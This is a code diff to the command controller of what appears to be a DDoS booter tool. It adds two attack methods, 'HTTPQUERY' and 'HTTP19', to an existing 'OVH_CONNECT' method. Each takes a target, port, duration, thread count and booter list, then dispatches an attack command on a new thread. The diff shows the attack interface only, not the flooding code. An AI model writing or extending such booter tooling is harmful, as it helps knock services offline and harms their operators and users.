@@ -78,6 +78,27 @@ def controler():
             threading.Thread(target=type_sender,args=('OVH_CONNECT',f'{target} {port} {times} {thread} {booters}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['OVHCONNECT']))
+        elif a =='HTTPQUERY' or a == 'HTTP-QUERY':
+           if len(com) == 7:
+            target = com[1]
+            port = com[2]
+            times = com[3]
+            thread = com[4]
+            booters = com[5]
+            methods = com[6]
+            threading.Thread(target=type_sender,args=('HTTP_QUERY',f'{target} {port} {times} {thread} {booters} {methods}')).start()
+            print(atk%(languages['DISPLAY']['ATTACK'],target,a))
+           else:print(format_banner(languages['METHODS']['HTTPQUERY']))
+        elif a =='HTTP19' or a == 'HTTP-19':
+           if len(com) == 6:
+            target = com[1]
+            port = com[2]
+            times = com[3]
+            thread = com[4]
+            methods = com[5]
+            threading.Thread(target=type_sender,args=('HTTP_19',f'{target} {port} {times} {thread} {methods}')).start()
+            print(atk%(languages['DISPLAY']['ATTACK'],target,a))
+           else:print(format_banner(languages['METHODS']['HTTP19']))
         elif a == 'MENU':
            clear_console()
            print(menu%(languages['DISPLAY']['MAIN'],time.ctime().split( )[4]))
